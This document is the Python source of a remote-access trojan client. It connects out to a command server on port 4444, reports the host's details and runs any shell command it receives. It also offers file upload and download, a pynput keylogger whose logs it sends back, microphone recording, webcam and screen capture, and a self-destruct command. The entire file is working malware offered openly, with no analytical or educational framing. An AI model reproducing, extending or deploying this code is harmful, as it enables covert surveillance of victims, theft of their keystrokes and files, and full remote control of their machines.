# --- Imports ---
import socket
import subprocess
import os
import base64
import threading
import time
import sys

# For screenshot
try:
    from PIL import ImageGrab
    import io
except ImportError:
    ImageGrab = None

# --- Globals ---
keylogger_thread = None
keylogger_running = False
keylogger_logfile = None
downloads_dir = None  # Global downloads directory

def start_keylogger(logfile):
    global keylogger_thread, keylogger_running, keylogger_logfile, downloads_dir
    if keylogger_running:
        return False, "Keylogger already running"
    try:
        from pynput import keyboard
    except ImportError:
        return False, "pynput not installed"
        
    # If no downloads_dir is set, create a basic one
    if not downloads_dir:
        downloads_dir = os.path.join("downloads", "default")
        os.makedirs(downloads_dir, exist_ok=True)
    
    # Ensure logfile is in downloads directory
    logfile = os.path.join(downloads_dir, os.path.basename(logfile))
    os.makedirs(os.path.dirname(logfile), exist_ok=True)
    
    keylogger_running = True
    keylogger_logfile = logfile
    def on_press(key):
        try:
            k = key.char
        except AttributeError:
            k = f"<{key}>"
        with open(keylogger_logfile, "a", encoding="utf-8") as f:
            f.write(k)
    def run_keylogger():
        with keyboard.Listener(on_press=on_press) as listener:
            while keylogger_running:
                time.sleep(0.1)
            listener.stop()
    keylogger_thread = threading.Thread(target=run_keylogger, daemon=True)
    keylogger_thread.start()
    return True, f"Keylogger started, logging to {logfile}"

def stop_keylogger():
    global keylogger_running, keylogger_thread, keylogger_logfile
    if not keylogger_running:
        return False, "Keylogger is not running"
    keylogger_running = False
    if keylogger_thread:
        keylogger_thread.join(timeout=2)
    keylogger_thread = None
    keylogger_logfile = None
    return True, "Keylogger stopped"

def connect_to_server(server_ip="127.0.0.1", server_port=4444):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))

    # Send platform and hostname info to server immediately after connecting
    import platform
    plat = platform.system()
    if plat.lower().startswith("win"):
        plat = "Windows"
    elif plat.lower().startswith("lin"):
        plat = "Linux"
    elif plat.lower().startswith("darwin") or plat.lower().startswith("mac"):
        plat = "Mac"
    else:
        plat = plat or "Unknown"
    hostname = platform.node() or "Unknown"
    info = f"{plat}|{hostname}"
    try:
        client.sendall(info.encode())
    except Exception:
        pass

    # Get local client address for directory naming (matches server's view)
    local_ip, local_port = client.getsockname()
    # Create a directory name that includes platform and hostname
    dir_parts = [f"{local_ip}_{local_port}"]
    if hostname:
        dir_parts.append(hostname)
    if plat:
        dir_parts.append(plat[:3])  # Use first 3 chars of platform (Win/Lin/Mac)
    global downloads_dir
    downloads_dir = os.path.join("downloads", "_".join(dir_parts))
    os.makedirs(downloads_dir, exist_ok=True)

    while True:
        try:
            # Receive command from server
            cmd = client.recv(1024).decode().strip()
            if not cmd:
                continue
            
            # For upload commands, we need to receive more data if the base64 is large
            if cmd.startswith("upload ") and "||FILEPATH||" not in cmd:
                # Receive the rest of the upload command
                cmd_buffer = cmd
                while "||FILEPATH||" not in cmd_buffer:
                    try:
                        chunk = client.recv(4096).decode(errors="replace")
                        if not chunk:
                            break
                        cmd_buffer += chunk
                    except:
                        break
                cmd = cmd_buffer

            # Handle audio capture command
            if cmd.lower().startswith("audio"):
                try:
                    import sounddevice as sd
                    import numpy as np
                    import wave
                    import io as _io
                    # Parse duration if provided
                    parts = cmd.split()
                    if len(parts) > 1 and parts[1].isdigit():
                        duration = int(parts[1])
                        if duration < 1 or duration > 60:
                            duration = 5
                    else:
                        duration = 5  # default seconds
                    samplerate = 44100
                    channels = 1
                    # Check for available input devices
                    if not any(dev['max_input_channels'] > 0 for dev in sd.query_devices()):
                        client.sendall(b"[!] No audio input device found\n[END OF STREAM]")
                    else:
                        audio = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=channels, dtype='int16')
                        sd.wait()
                        # Save to WAV in memory
                        wav_buffer = _io.BytesIO()
                        with wave.open(wav_buffer, 'wb') as wf:
                            wf.setnchannels(channels)
                            wf.setsampwidth(2)  # 16 bits = 2 bytes
                            wf.setframerate(samplerate)
                            wf.writeframes(audio.tobytes())
                        wav_bytes = wav_buffer.getvalue()
                        b64_audio = base64.b64encode(wav_bytes).decode()
                        client.sendall(f"AUDIO:{b64_audio}\n[END OF STREAM]".encode())
                except Exception as e:
                    client.sendall(f"[!] Audio capture error: {str(e)}\n[END OF STREAM]".encode())
                continue

            # Handle webcam capture command
            if cmd.lower() == "webcam":
                try:
                    import cv2
                    cam = cv2.VideoCapture(0)
                    if not cam or not cam.isOpened():
                        client.sendall(b"[!] No webcam found\n[END OF STREAM]")
                        cam.release()
                        continue
                    ret, frame = cam.read()
                    cam.release()
                    if not ret:
                        client.sendall(b"[!] Failed to capture webcam image\n[END OF STREAM]")
                        continue
                    # Encode image as PNG in memory
                    is_success, buffer = cv2.imencode(".png", frame)
                    if not is_success:
                        client.sendall(b"[!] Failed to encode webcam image\n[END OF STREAM]")
                        continue
                    b64_img = base64.b64encode(buffer.tobytes()).decode()
                    client.sendall(f"WEBCAM:{b64_img}\n[END OF STREAM]".encode())
                except Exception as e:
                    client.sendall(f"[!] Webcam error: {str(e)}\n[END OF STREAM]".encode())
                continue

            # Handle keylogger start command
            if cmd.startswith("keylogger_start"):
                try:
                    parts = cmd.split(" ", 1)
                    # Always save in downloads/<ip_port>/
                    if len(parts) > 1 and parts[1].strip():
                        base_name = os.path.basename(parts[1].strip().strip('"\''))
                        if not base_name:
                            base_name = f"keylog_{int(time.time())}.txt"
                    else:
                        base_name = f"keylog_{int(time.time())}.txt"
                    logfile = os.path.join(downloads_dir, base_name)
                    os.makedirs(os.path.dirname(logfile), exist_ok=True)
                    success, msg = start_keylogger(logfile)
                except Exception as e:
                    success, msg = False, f"Keylogger error: {str(e)}"
                client.sendall((msg + "\n[END OF STREAM]").encode())
                continue

            # Handle keylogger stop command
            if cmd.strip() == "keylogger_stop":
                try:
                    # capture logfile path before stopping
                    current_log = keylogger_logfile
                    success, msg = stop_keylogger()
                except Exception as e:
                    success, msg = False, f"Keylogger error: {str(e)}"

                # If stopped successfully and a logfile exists, send it to server
                if success and current_log and os.path.exists(current_log):
                    try:
                        with open(current_log, "rb") as f:
                            data = f.read()
                        b64_log = base64.b64encode(data).decode()
                        fname = os.path.basename(current_log)
                        client.sendall(f"KEYLOG:{fname}:{b64_log}\n[END OF STREAM]".encode())
                    except Exception as e:
                        # fallback to sending message
                        client.sendall((f"[!] Keylog send failed: {str(e)}\n[END OF STREAM]").encode())
                else:
                    client.sendall((msg + "\n[END OF STREAM]").encode())
                continue

            # Handle self-destruct command
            if cmd.lower() in ("selfdestruct", "delete"):
                try:
                    script_path = os.path.abspath(sys.argv[0])
                    client.sendall(b"[+] Self-destruct command received. Deleting client...\n[END OF STREAM]")
                    client.close()
                    os.remove(script_path)
                except Exception as e:
                    # Try to send error to server if possible
                    try:
                        client.sendall(f"[!] Self-destruct failed: {str(e)}\n[END OF STREAM]".encode())
                    except Exception:
                        pass
                finally:
                    sys.exit(0)

            if cmd.lower() == "exit":
                break

            # Handle "cd" separately
            if cmd.startswith("cd "):
                try:
                    os.chdir(cmd[3:].strip())
                    client.sendall(b"Changed directory\n[END OF STREAM]")
                except Exception as e:
                    client.sendall(str(e).encode() + b"\n[END OF STREAM]")
                continue  # go back to loop

            # Handle file upload command
            if cmd.startswith("upload "):
                try:
                    # Parse command: upload <b64_content>||FILEPATH||<filepath>
                    delimiter = "||FILEPATH||"
                    if delimiter not in cmd:
                        # Debug: show what we received
                        output = f"[!] Error: Invalid upload command format (delimiter not found)\n[DEBUG] Command length: {len(cmd)}, First 100 chars: {cmd[:100]}"
                        client.sendall(output.encode() + b"\n[END OF STREAM]")
                        continue
                    
                    parts = cmd.split(delimiter, 1)
                    b64_section = parts[0][7:].strip()  # Remove "upload " prefix
                    filepath = parts[1].strip().strip('"\'')
                    
                    try:
                        # Create directories if they don't exist
                        directory = os.path.dirname(filepath)
                        if directory:
                            os.makedirs(directory, exist_ok=True)
                        # Verify we can write to the directory
                        if not os.access(directory or ".", os.W_OK):
                            raise PermissionError(f"Cannot write to directory: {directory or '.'}")
                        # Decode content (with validation)
                        try:
                            file_content = base64.b64decode(b64_section)
                        except Exception as e:
                            raise ValueError(f"Invalid base64 content: {str(e)}")
                        # Write file with proper error handling
                        with open(filepath, "wb") as f:
                            f.write(file_content)
                        output = f"[+] File uploaded successfully to {filepath}"
                    except PermissionError as e:
                        output = f"[!] Permission denied: {str(e)}"
                    except OSError as e:
                        output = f"[!] File system error: {str(e)}"
                    except ValueError as e:
                        output = f"[!] Data error: {str(e)}"
                except Exception as e:
                    output = f"[!] Upload failed: {str(e)}"
                client.sendall(output.encode() + b"\n[END OF STREAM]")
                continue

            # Handle file download command
            if cmd.startswith("download "):
                try:
                    # Parse command safely
                    parts = cmd.split(" ", 1)
                    if len(parts) < 2:
                        output = "[!] Error: Missing file path"
                        client.sendall(output.encode() + b"\n[END OF STREAM]")
                        continue
                    filepath = parts[1].strip().strip('"\'')  # Remove quotes if present
                    # Validate file
                    if not os.path.exists(filepath):
                        output = f"[!] Error: File not found: {filepath}"
                        client.sendall(output.encode() + b"\n[END OF STREAM]")
                        continue
                    if not os.path.isfile(filepath):
                        output = f"[!] Error: Not a file: {filepath}"
                        client.sendall(output.encode() + b"\n[END OF STREAM]")
                        continue
                    if not os.access(filepath, os.R_OK):
                        output = f"[!] Error: Permission denied reading file: {filepath}"
                        client.sendall(output.encode() + b"\n[END OF STREAM]")
                        continue
                    # Read and encode file
                    try:
                        with open(filepath, "rb") as f:
                            file_content = f.read()
                        b64_content = base64.b64encode(file_content).decode()
                        output = f"FILE:{b64_content}"
                    except OSError as e:
                        output = f"[!] Error reading file: {str(e)}"
                except Exception as e:
                    output = f"[!] Download failed: {str(e)}"
                client.sendall(output.encode() + b"\n[END OF STREAM]")
                continue

            # Handle screenshot command
            if cmd == "screenshot":
                if ImageGrab is None:
                    output = "[!] Screenshot feature not available (Pillow not installed)"
                else:
                    try:
                        # Capture the screenshot
                        screenshot = ImageGrab.grab()
                        # Convert to bytes
                        img_byte_array = io.BytesIO()
                        screenshot.save(img_byte_array, format='PNG')
                        img_bytes = img_byte_array.getvalue()
                        # Encode and send
                        b64_screenshot = base64.b64encode(img_bytes).decode()
                        output = f"SCREENSHOT:{b64_screenshot}"
                    except Exception as e:
                        output = f"[!] Screenshot failed: {str(e)}"
                client.sendall(output.encode() + b"\n[END OF STREAM]")
                continue

            # Execute command
            output = subprocess.getoutput(cmd)
            if output == "":
                output = "[+] Command executed (no output)"
            # ✅ Always append [END OF STREAM] for consistency
            client.sendall(output.encode() + b"\n[END OF STREAM]")

        except Exception as e:
            break

    client.close()

# --- Main entry ---
if __name__ == "__main__":
    # You can change the server IP/port here if needed
    connect_to_server(server_ip="127.0.0.1", server_port=4444)
